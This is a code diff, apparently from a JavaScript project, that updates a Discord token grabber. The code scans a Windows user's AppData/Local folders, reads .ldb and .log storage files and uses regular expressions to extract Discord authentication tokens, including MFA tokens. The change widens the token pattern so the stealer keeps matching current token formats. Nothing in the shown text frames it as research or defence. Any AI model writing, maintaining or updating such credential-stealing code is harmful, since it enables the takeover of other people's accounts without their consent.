@@ -55,7 +55,7 @@ const local = "C:/Users/" + user + "/AppData/Local"
                         let filtro = files.filter(f => f.split('.').pop() === "ldb")
                         for (i = 0; i < filtro.length; i++) {
                             fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function(err, data) {
-                                let semmfa = new RegExp(/[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{38}/)
+                                let semmfa = new RegExp(/[\d\w_-]{26}\.[\d\w_-]{6}\.[\d\w_-]{38}/)
                                 let mfa = new RegExp(/mfa\.[\w-]{84}/g)
     
                                 let [tokenuser] = semmfa.exec(data) || mfa.exec(data) || [null];
@@ -78,7 +78,7 @@ const local = "C:/Users/" + user + "/AppData/Local"
                         let filtro = files.filter(f => f.split('.').pop() === "log")
                         for (i = 0; i < filtro.length; i++) {
                             fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function(err, data) {
-                                let semmfa = new RegExp(/[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{38}/)
+                                let semmfa = new RegExp(/[\d\w_-]{26}\.[\d\w_-]{6}\.[\d\w_-]{38}/)
                                 let mfa = new RegExp(/mfa\.[\w-]{84}/g)
 
                                 if (semmfa.test(data)) {}
